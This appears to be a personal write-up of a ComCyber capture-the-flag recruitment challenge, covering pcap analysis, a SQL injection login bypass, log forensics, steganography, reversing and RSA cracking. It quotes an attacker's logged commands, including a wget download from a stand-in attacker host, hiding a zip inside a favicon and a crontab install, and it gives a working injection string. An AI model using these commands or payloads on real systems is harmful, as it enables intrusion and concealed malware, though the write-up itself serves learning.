# COMCYBER CTF

The September 2 2024, the Commandement de la CyberdÃ©fense (ComCyber) made a CTF to recruit new people in "cyber sous-officiers"
The challenge was noted easy-medium

I'll talk about my experience in this post and how i manage to solve it, 

if you want to see the official writeup : https://blog.root-me.org/posts/writeup_comcyber/


## First Step : Network Analysis

In the first step of the CTF you need to download a .pcap file and analyze it using Wireshark 

There is a protocol called TELNET which you can filter in wireshark and scrolling through it you can read the first flag encoded,
You can get the first flag by decoding Base64 encoded string,

If you keep searching in the PCAP and follow the UDP Stream, you can acccess to 163.172.68.42.23:5000.

## Second Step : SQL Injection (lol)

The second flag is a login page, you can access it by doing ' or 1=1; -- 


## Third Step : Forensics

In the dashboard you can download a log file, once the file is download i made a small python script ton only get useful informations
```python
filename = 'debug.txt'

with open(filename, 'r') as fichier:
    lignes = fichier.readlines()
lignes_cmd = [ligne for ligne in lignes if 'CMD' in ligne]
for ligne in lignes_cmd:
    print(ligne.strip())
```

You have multiple result but the importants ones are : 


    echo 'efa3fb1f409aa622dddd7220ad6567580fb68b68' > /tmp/.password
    vim message.txt
    wget -O /dev/null https://attacker.site/m4lw3r3
    zip --password ($cat /tmp/.password) secret.zip message.txt m4lw3r3
    cat /app/static/assets/images/favicon.ico ./secret.zip > /app/static/assets/images/favicon.ico
    echo '2a202a202a202a202a20206563686f2027524d7b393835336561303861623734373265653865663237633631363239396461663530653330626439307d270a' | xxd -r -p | crontab -
    crontab -l
    rm -rf ./message.txt ./secret.zip ./m4lw3r3
    rm -rf /tmp/.password


You can get the third flag in Hexadecimal into the crontab


## Fourth Step : Binwalk Steganography

With binwalk you can extract files from the favicon, 

You have a zipfile inside the binwalk which you can extract using the password you found in the logs, 

Once it's extracted you have another flag, in the message.txt

There is also a m4lw3r3

## Fifth Step : Reverse Engineering

Now, you have a m4lw3r3 binary file and when you run it it ask for 2 inputs, [input1] [input2]

Using Ghidra you can reverse the file, the first input, is cut in 3 strings

## Sixth Step : RSA Cryptography

This part was the "hardest part" of the CTF, you need to find the input2, the program is using cryptographic functions for RSA encryptions, using the variables n, e and c, 

Once you have these variables you need to convert it from hexadecimal to decimal, i searched if there were differents vulnerabilities to crack the RSA, using Boneh Durfee or Wiener, but at the end you can do it with Wiener and RSACTFTOOL

When you have the string character you can go back to the dashboard and enable communication, here you have the last flag

## Conclusion

Overall the challenge was fun to do, but i wish it was a bit harder to do the login connection, i hope they will do more CTF like this, and i think it's a good idea to recruit based on CTF !
